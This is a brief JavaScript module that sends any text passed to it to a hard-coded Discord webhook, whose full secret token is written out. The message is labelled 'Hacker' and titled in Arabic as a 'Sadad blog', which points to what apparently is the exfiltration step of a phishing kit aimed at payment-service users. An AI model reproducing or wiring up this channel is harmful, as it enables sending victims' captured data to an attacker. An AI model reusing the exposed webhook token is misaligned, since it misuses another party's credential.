import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1322520401666117723/cndQmep9nV4NAGj59eDKo6dzYlcGdgE3JS-TUygf-fbSg20YgiG4FrXMYw1ZaoMzWPEf",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
